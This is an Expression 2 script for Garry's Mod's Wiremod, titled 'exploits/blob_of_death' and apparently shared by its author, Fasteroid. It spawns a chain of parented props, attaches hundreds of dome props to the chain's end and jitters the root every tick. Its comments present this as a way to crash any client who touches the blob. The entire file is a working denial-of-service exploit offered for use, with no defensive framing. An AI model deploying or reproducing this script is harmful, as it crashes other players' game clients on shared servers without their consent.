@name exploits/blob_of_death
@persist BLOB_POWER CHAIN_LENGTH BLOB_SPACE [BLOB_MODEL,BLOB_CHAIN]:string Length Spawned Chain:entity Z_Height Root:entity

# by Fasteroid
# the sequel to portal_of_crashing.txt
# powered by recursive prop parenting (again)
# any client who touches the blob is a goner

if( first() ){
    
    propSpawnUndo(0)
    
    BLOB_POWER   = 512
    BLOB_SPACE   = 10
    BLOB_MODEL   = "models/props_phx/construct/metal_dome360.mdl"
    BLOB_CHAIN   = "models/hunter/plates/plate.mdl"
    
    CHAIN_LENGTH = 14 # 14 seems to be max
    
    Root = propSpawn(BLOB_CHAIN,entity():pos(),1)
    
    Chain = Root
    
    runOnTick(1)
    
}

if( Length < CHAIN_LENGTH ){
    if( propCanCreate() & Length < CHAIN_LENGTH ){ # these can be replaced with while loops on some servers
        local Old = Chain
        local Rotation = random(0,360)
        local Pos = Chain:pos()
        #local Ang = Chain:toWorld( ang(16,Rotation,0) )
        Chain = propSpawn(BLOB_CHAIN,Pos,0)
        Chain:parentTo(Old)
        Length++
    }
}
else{
    if( propCanCreate() & Spawned < BLOB_POWER ){
        Prop = propSpawn(BLOB_MODEL,Chain:pos(),ang(0,random(360),0),0)
        Prop:parentTo(Chain)
        if(Prop:isValid()){
            Spawned++
        }
    }
    Root:setPos( entity():pos() + randvec() * 0.1 )
}

